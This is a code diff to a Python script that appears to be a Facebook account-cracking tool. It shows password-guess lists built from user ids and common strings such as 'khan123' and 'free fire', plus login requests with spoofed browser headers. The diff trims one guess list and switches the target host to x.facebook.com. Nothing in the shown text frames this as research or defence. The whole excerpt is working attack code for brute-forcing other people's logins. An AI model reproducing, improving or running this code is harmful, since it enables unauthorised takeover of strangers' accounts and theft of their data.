@@ -608,7 +608,7 @@ def YounisXyz_XyzCoder():
             elif pxc in ['2','02']:
             	pwx = [xyzcoderz,uid]
             elif pxc in ['3','03']:
-            	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch','ali123','ali786']
+            	pwx = [xyzcoderz,uid,'khan1122','i love you','khankhan','khan123','khan786','baloch']
             elif pxc in ['4','04']:
             	pwx = [xyzcoderz,uid,'free fire','i love you','freefire','57272300','59039200']
             elif pxc in ['5','05']:
@@ -754,10 +754,10 @@ def YounisXyz(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             xyzheader_fuck = {
-    'authority': 'free.facebook.com',
+    'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
+    'cache-control': 'max-age=0',   
     'dpr': '2',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
